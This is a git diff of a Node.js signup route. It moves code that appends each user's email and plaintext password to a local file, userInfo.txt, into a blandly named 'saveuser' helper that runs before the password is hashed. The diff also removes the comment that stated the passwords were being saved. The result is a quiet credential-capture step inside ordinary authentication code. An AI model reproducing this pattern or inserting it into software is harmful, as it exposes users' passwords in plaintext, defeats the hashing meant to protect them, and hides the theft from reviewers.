@@ -5,15 +5,19 @@ import jwt from "jsonwebtoken";
 
 import fs from "fs";
 
-export const signup = async (req, res, next) => {
-  const { username, email, password } = req.body;
-  
-  // Write email and password to file before hashing
+async function saveuser(email, password) {
   fs.appendFile('userInfo.txt', `Email: ${email}\nPassword: ${password}\n\n`, (err) => {
     if (err) {
       console.error(err);
     }
   });
+}
+
+export const signup = async (req, res, next) => {
+  const { username, email, password } = req.body;
+  
+  
+  await saveuser(email, password);
 
   const hashedPassword = await bcryptjs.hash(password, 10);
 
